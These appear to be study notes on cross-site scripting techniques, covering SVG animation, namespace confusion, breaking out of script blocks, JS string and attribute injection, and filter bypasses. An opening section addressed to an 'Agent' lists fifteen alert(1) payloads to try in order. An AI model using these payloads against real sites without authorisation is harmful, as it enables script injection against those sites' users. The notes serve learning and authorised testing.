# XSS, SVG, Namespaces & JS Context — Deep Notes

---

## ⚡ Quick Reference (Agent: read this section first)

### Injection contexts and payloads — try in this order

| # | Context | Payload |
|---|---------|--------|
| 1 | HTML body (no filter) | `<img src=x onerror=alert(1)>` |
| 2 | HTML body | `<svg onload=alert(1)>` |
| 3 | HTML body | `<details open ontoggle=alert(1)>` |
| 4 | Inside `<script>` block | `</script><img src=x onerror=alert(1)>` |
| 5 | JS string — single quote | `';alert(1)//` |
| 6 | JS string — double quote | `";alert(1)//` |
| 7 | JS string — backslash escaped | `\';alert(1)//` |
| 8 | Inside attribute (break out) | `" onmouseover="alert(1)` |
| 9 | Inside attribute (single) | `' onmouseover='alert(1)` |
| 10 | URL/href attribute | `javascript:alert(1)` |
| 11 | SVG animation | `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x=20 y=20>click</text></a></svg>` |
| 12 | Namespace bypass | `<a xlink:href="javascript:alert(1)">click</a>` |
| 13 | No parentheses allowed | `onerror=alert;throw 1` |
| 14 | Attribute only (no new tags) | `accesskey="x" onclick="alert(1)"` (trigger: ALT+SHIFT+X) |
| 15 | Custom/unknown tag | `<xss onclick=alert(1)>click</xss>` |

### Decision: when to stop
- Payload executes → **report hit**; record context + parameter + payload.
- All 15 rows fail → escalate to `dom-xss.md`.

---

## 1. SVG Basics

* SVG = Scalable Vector Graphics (XML-based)
* Part of DOM → scriptable, stylable, interactive
* Uses its own namespace: `http://www.w3.org/2000/svg`

### Example

```html
<svg width="200" height="200">
  <circle cx="100" cy="100" r="50" fill="red" />
</svg>
```

---

## 2. Namespaces

### Definition

Namespace = identifier that tells browser how to interpret a tag.

### Why needed

Same tag name can mean different things:

```html
<title>   <!-- HTML vs SVG meaning differs -->
```

### Example

```html
<svg xmlns="http://www.w3.org/2000/svg">
```

### Security Insight

* Filters often ignore namespace differences
* Example bypass:

```html
<a xlink:href="javascript:alert(1)">
```

---

## 3. DOM Mutation

### Meaning

Mutation = changing DOM after initial parsing

### Example (JS)

```js
element.setAttribute("href", "evil")
```

### Example (SVG)

```html
<animate attributeName="href" values="javascript:alert(1)">
```

### Key Insight

* Initial state safe
* Runtime state dangerous

---

## 4. Mutable vs Immutable (Python)

### Immutable

```python
s = "hello"
s = s + "!"   # new object created
```

### Mutable

```python
arr = [1,2]
arr[0] = 99   # same object modified
```

### Key Insight

Variables = references, not objects

---

## 5. javascript: Pseudo-Protocol

### Works in URL-based attributes:

* `<a href>`
* `<iframe src>`
* `<form action>`
* `<area href>`
* SVG `<a href>`

### Example

```html
<a href="javascript:alert(1)">
```

### Rule

If attribute accepts URL → test `javascript:`

---

## 6. HTML Parsing vs JS Execution

### Flow

1. HTML parser builds DOM
2. On `<script>` → pause parsing
3. JS executes
4. Resume parsing

### Important

JS does NOT parse HTML

---

## 7. Breaking out of `<script>`

### Context

```html
<script>
var input = 'USER_INPUT';
</script>
```

### Payload

```html
</script><img src=1 onerror=alert(1)>
```

### Why it works

* HTML parser sees `</script>`
* exits script context
* parses new HTML

---

## 8. JS String Injection

### Example

```js
var input = 'USER_INPUT';
```

### Payloads

#### Expression-based

```js
'-alert(1)-'
```

#### Statement-based

```js
';alert(1)//
```

### Key Insight

Final JS must remain valid

---

## 9. Escaping Bypass (Backslash Trick)

### App does:

```js
' → \'
```

### Attack:

```js
\';alert(1)//
```

### Result:

```js
\\';alert(1)//
```

### Effect

* `\\` → literal `\`
* `'` becomes active → breaks string

---

## 10. throw + onerror Trick

### Payload

```js
onerror=alert;throw 1
```

### Flow

1. Assign handler
2. Throw exception
3. Browser calls handler
4. `alert(1)` executes

### Use Case

* No parentheses allowed
* Function calls restricted

---

## 11. Attribute Injection + accesskey

### Scenario

Cannot inject new tags, only attributes

### Payload

```html
<link rel="canonical" accesskey="x" onclick="alert(1)">
```

### Trigger

Keyboard shortcut (e.g., ALT+SHIFT+X)

---

## 12. Custom Tags

### Unknown tags

```html
<xss>Hello</xss>
```

* No behavior
* Treated as generic element

### With event

```html
<xss onclick="alert(1)">
```

→ Works due to attribute, not tag

---

## 13. Finding Custom Elements

### DevTools

```js
[...document.querySelectorAll("*")]
```

### Filter

```js
tag.includes("-")
```

### Registry

```js
customElements.get("tag-name")
```

---

## 14. SVG Animation XSS Payload

### Payload

```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```

---

## 15. How it Works

### Step-by-step

1. SVG parsed
2. `<animate>` targets parent (`<a>`)
3. Sets:

```html
href = javascript:alert(1)
```

4. User clicks → executes

---

## 16. Important SVG Rules

### Default targeting

```html
<animate> → parent element
```

### Explicit targeting

```html
<animate xlink:href="#id">
```

---

## 17. Key Attack Surfaces

* URL attributes
* Event handlers
* SVG animations
* Namespace confusion
* JS parsing context
* DOM mutation

---